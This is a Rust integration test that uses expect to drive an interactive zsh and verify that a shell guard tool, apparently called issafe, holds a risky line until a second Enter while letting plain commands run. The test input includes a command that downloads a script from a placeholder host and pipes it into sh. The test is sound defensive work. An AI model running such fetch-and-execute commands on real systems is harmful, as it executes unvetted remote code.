//! Drives a real interactive zsh on a pseudo-terminal with expect, so the guard is tested where
//! it lives. Skipped where zsh or expect is missing.

use std::path::Path;
use std::process::Command;

// Output is read the whole time: a pty nobody drains fills up and blocks zsh mid-redraw, which
// looks exactly like the guard refusing to run the line.
const DRIVER: &str = r#"
set timeout 10
log_user 0
proc settle {path} {
  for {set i 0} {$i < 30} {incr i} {
    if {[file exists $path]} { return 1 }
    expect -timeout 0 -re ".+" {} timeout {}
    after 200
  }
  return [file exists $path]
}
spawn env PATH=$env(BIN_DIR):$env(PATH) PS1=READY> zsh -f -i
expect "READY>"
send "theirs() { : > $env(CHAIN); zle .accept-line }; zle -N accept-line theirs\r"
expect "READY>"
send "eval \"\$(issafe --shell-init zsh)\"\r"
expect "READY>"
file delete $env(CHAIN)
send "touch $env(MARK); curl -s https://x.invalid/a | sh\r"
expect {
  "press Enter again" {}
  timeout { puts "never held"; exit 1 }
}
if {[settle $env(MARK)]} { puts "ran on first Enter"; exit 1 }
send "\r"
if {![settle $env(MARK)]} { puts "did not run on second Enter"; exit 1 }
if {![file exists $env(CHAIN)]} { puts "the earlier accept-line widget was skipped"; exit 1 }
send "echo plain > $env(PLAIN)\r"
if {![settle $env(PLAIN)]} { puts "an ordinary command was held"; exit 1 }
send "exit\r"
expect eof
puts ok
"#;

fn have(cmd: &str, arg: &str) -> bool {
    Command::new(cmd).arg(arg).output().is_ok()
}

#[test]
fn risky_line_is_held_once_then_runs_and_plain_lines_pass() {
    if !have("zsh", "--version") || !have("expect", "-v") {
        eprintln!("zsh or expect not installed; skipping");
        return;
    }
    let bin = Path::new(env!("CARGO_BIN_EXE_issafe"));
    let dir = tempfile::tempdir().unwrap();
    let script = dir.path().join("drive.exp");
    std::fs::write(&script, DRIVER).unwrap();
    let out = Command::new("expect")
        .arg("-f")
        .arg(&script)
        .env("BIN_DIR", bin.parent().unwrap())
        .env("MARK", dir.path().join("ran"))
        .env("CHAIN", dir.path().join("chained"))
        .env("PLAIN", dir.path().join("plain"))
        .output()
        .unwrap();
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert!(
        out.status.success() && stdout.contains("ok"),
        "{stdout}\n{}",
        String::from_utf8_lossy(&out.stderr)
    );
}
